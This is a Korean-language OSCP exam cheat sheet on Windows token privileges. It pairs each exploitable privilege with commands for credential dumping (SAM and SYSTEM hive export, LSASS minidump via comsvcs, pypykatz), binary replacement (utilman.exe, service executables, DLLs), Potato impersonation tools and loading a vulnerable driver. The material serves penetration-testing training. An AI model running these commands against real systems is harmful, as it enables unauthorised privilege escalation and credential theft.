# Windows 권한(Privilege) — OSCP 치트시트

한 줄 요약: OSCP에서 실제로 점수가 나오는 권한은 5개뿐 (12, 13, 14, 15, 16).
나머지 23개는 읽어두는 참고자료. 쉘 땄으면 무조건 `whoami /priv`부터.

# 기본

- 권한 확인: `whoami /priv` — 윈도우 쉘 따면 첫 실행
- 그룹 + 권한 전체: `whoami /all`

# 읽는 법 (3줄)

- State가 Disabled여도 된다. 공격 도구가 알아서 켠다. → 목록에 보이면 공격 대상.
- 목록에 아예 없으면 못 쓴다.
- 웹쉘, MSSQL 같은 서비스 계정 쉘이면 16번(SeImpersonate)이 있을 확률이 높다.

# 1티어 — OSCP 시험 레벨, 이 5개가 답

### 12. SeBackupPrivilege

- 뜻: 백업
- 직독직해: Backup(백업하다) → 백업 프로그램처럼 다 읽어버리는 특권
- 핵심: 파일 권한(ACL) 무시하고 모든 파일 읽기. Administrator 파일도 그냥 복사됨.
- 쓰는 법:
  - SAM/SYSTEM 덤프: `reg save hklm\sam C:\temp\sam` + `reg save hklm\system C:\temp\system`
  - ACL 무시하고 파일 복사: `robocopy /b C:\Users\Administrator\Desktop C:\temp secret.txt`
  - Kali에서 해시 추출: `secretsdump.py -sam sam -system system LOCAL`

### 13. SeRestorePrivilege

- 뜻: 복원
- 직독직해: Restore(복원하다) → 백업 복원하듯 아무데나 쓰는 특권
- 핵심: ACL 무시하고 모든 파일 쓰기. 백업이 읽기면 이건 쓰기.
- 쓰는 법: 서비스 실행 파일을 내 파일로 교체 → 서비스 재시작 → SYSTEM
  - 교체: `copy malicious.exe C:\Path\To\Service.exe`
  - 재시작: `sc stop 취약서비스` 후 `sc start 취약서비스`
- 12번과 같이 붙어있는 경우가 많음 (Backup Operators 그룹)

### 14. SeTakeOwnershipPrivilege

- 뜻: 소유권 강탈
- 직독직해: Take(가져가다) Ownership(소유권) → 남의 소유권을 빼앗는 특권
- 핵심: 아무 파일/레지스트리의 소유자가 될 수 있음. 소유권만으론 권한이 없으니 3단계로 씀:
  소유권 획득 → 나에게 권한 부여 → 읽기/쓰기
- 쓰는 법 (utilman.exe 교체 → 로그온 화면 접근성 버튼 = SYSTEM cmd):
  - 소유권 획득: `takeown /f C:\Windows\System32\utilman.exe`
  - 권한 부여: `icacls C:\Windows\System32\utilman.exe /grant Everyone:F`
  - 교체: `copy cmd.exe C:\Windows\System32\utilman.exe`
  - 재부팅 트리거가 필요하면 23번(SeShutdown)으로 해결

### 15. SeDebugPrivilege

- 뜻: 디버그
- 직독직해: Debug(디버그하다) → 모든 프로세스를 디버거처럼 만지는 특권
- 핵심: SYSTEM 프로세스(lsass.exe) 메모리를 열 수 있음. 관리자인데 SYSTEM이 아닐 때 크리덜을 꺼내는 통로.
- 쓰는 법:
  - LSASS 덤프: `rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid> C:\temp\out.dmp full` (PID는 `tasklist`로 확인)
  - Kali에서 크리덜 추출: `pypykatz lsa minidump out.dmp`
  - Meterpreter면: `load kiwi` 후 `creds_all`

### 16. SeImpersonatePrivilege

- 뜻: 가장 (다른 사람인 척)
- 직독직해: Impersonate(가장하다) → 다른 사용자 토큰으로 실행하는 특권
- 핵심: 모든 서비스 계정에 기본 부여. 웹쉘/서비스 쉘이면 거의 무조건 있음.
- 원리: 이 권한만으로 토큰을 훔칠 수는 없음. SYSTEM이 나한테 인증하게 유도해서(Potato) 토큰을 받아냄.
- OS 버전별 도구:
  - Server 2019 / Win10 1809 이상: `PrintSpoofer.exe -i -c cmd`
  - Server 2012 ~ 2022 폭넓게: `GodPotato -cmd "cmd /c whoami"`
  - Server 2008 / 2012 이하 구형: `JuicyPotato.exe -l 1337 -p C:\windows\system32\cmd.exe -a "/c whoami" -t *`
  - 전부 모아둔 올인원: `SweetPotato.exe -a "whoami"`

# 2티어 — 심화 (OSCP보다 한 수 위, 보이면 럭키)

### 25. SeManageVolumePrivilege

- 뜻: 볼륨 관리
- 직독직해: Manage(관리하다) Volume(볼륨) → 디스크를 관리하는 특권
- 핵심: 툴 한 방에 C:\ 전체 쓰기 권한 → 시스템 DLL 교체 → SYSTEM.
  기본 부여가 아니라 정책에서 따로 줘야 보임 → 보이는 순간 고평가.
- 쓰는 법:
  - C:\ 전체 쓰기 획득: `SeManageVolumeAbuse.exe`
  - DLL 교체: `copy PrintConfig.dll C:\Windows\System32\spool\drivers\`
  - 스풀러 재시작: `sc stop spooler` 후 `sc start spooler` → SYSTEM

### 27. SeLoadDriverPrivilege

- 뜻: 드라이버 로드
- 직독직해: Load(올리다) Driver(드라이버) → 커널 드라이버를 올리는 특권
- 핵심: 드라이버 = 커널 권한(RING-0). 서명 안 된 내 드라이버는 못 올리고,
  서명됐는데 취약한 드라이버(Capcom.sys)를 대신 올림.
- 쓰는 법:
  - 드라이버 등록 + 로드: `EoPLoadDriver System01 C:\temp\Capcom.sys`
  - SYSTEM 쉘: `ExploitCapcom.exe`

### 28. SeTcbPrivilege

- 뜻: 운영체제 일부로 행동
- 직독직해: TCB(신뢰할 수 있는 컴퓨팅 기반) → OS 커널과 동격의 신뢰를 받는 특권
- 핵심: 아무 계정 토큰이나 만들 수 있음 → 사실상 SYSTEM. 기본 부여 계정 없음.
- 판정: 보이면 이미 끝난 거나 마찬가지.

### 조합용 (단독으론 안 되는 것들)

- 4. SeIncreaseQuotaPrivilege + 18. SeAssignPrimaryTokenPrivilege
  - 16번(가장)의 짝꿍. Potato 도구가 알아서 같이 씀. 이 세트가 보이면 16번과 동일하게 처리.
- 23. SeShutdownPrivilege
  - 재부팅이 트리거인 공격(utilman 교체 등)의 마무리용. `shutdown /r /t 0`
- 10. SeCreateSymbolicLinkPrivilege
  - 링크 생성. 다른 취약점과 조합할 때 재료.
- 8. SeCreateGlobalPrivilege
  - 서비스 계정에 기본 부여라 자주 보이지만, 그 자체가 공격은 아님.
- 26. SeSystemEnvironmentPrivilege
  - UEFI 펌웨어 변수 수정. 실전 공격 경로 희귀.

# 3티어 — 무시해도 됨 (1~3, 5~7, 9, 11, 17, 19~22, 24)

전부 성능·편의·감사용. 권한상승 경로 없음. 보여도 넘어가면 됨.

- 1. SeLockMemoryPrivilege — 메모리 잠금. Lock(잠그다) Memory(메모리). 성능 옵션.
- 2. SeCreatePagefilePrivilege — 페이지 파일 생성. Create(만들다) Pagefile. 가상메모리 설정.
- 3. SeIncreaseWorkingSetPrivilege — 작업 집합(프로세스 메모리 점유량) 증가. 모든 사용자 기본 부여라 다 보임.
- 5. SeIncreaseBasePriorityPrivilege — CPU 우선순위 증가.
- 6. SeSystemProfilePrivilege — 시스템 전체 성능 분석.
- 7. SeProfileSingleProcessPrivilege — 프로세스 하나만 성능 분석. 6번 축소판.
- 9. SeCreatePermanentPrivilege — 영구 커널 객체 생성. 드라이버 개발용.
- 11. SeChangeNotifyPrivilege — 폴더 통과 검사 우회. 모든 사용자 기본 부여.
- 17. SeDelegateSessionUserImpersonatePrivilege — 같은 세션 내 가장 위임. 기본 부여 없음, 익스플로잇 희귀.
- 19. SeSecurityPrivilege — 보안 로그 열람/삭제. 흔적 지우기용, 권한상승 아님.
- 20. SeAuditPrivilege — 보안 감사 기록 생성. 가짜 로그 쓰기용.
- 21. SeSystemtimePrivilege — 시스템 시각 변경.
- 22. SeTimeZonePrivilege — 시간대 변경. 전원 기본 부여.
- 24. SeUndockPrivilege — 도킹 해제. 서버/VM에선 무의미.

# 빠른 의사결정

`whoami /priv` 실행 후:

- 16 보임 → OS 버전 확인 → PrintSpoofer / GodPotato / JuicyPotato
- 12 보임 → reg save SAM/SYSTEM → Kali secretsdump
- 13 보임 → 서비스 파일 교체 자리 탐색 → 교체 후 재시작
- 14 보임 → utilman.exe 교체 → 로그온 화면 트리거
- 15 보임 → LSASS 덤프 → pypykatz
- 25 보임 → SeManageVolumeAbuse → PrintConfig.dll
- 27 보임 → Capcom.sys + ExploitCapcom
- 4+18 세트 → 16번과 동일하게 Potato
- 이 외 전부 → 무시하고 다른 privesc 벡터로 (서비스 설정, AlwaysInstallElevated, 자동실행 등)
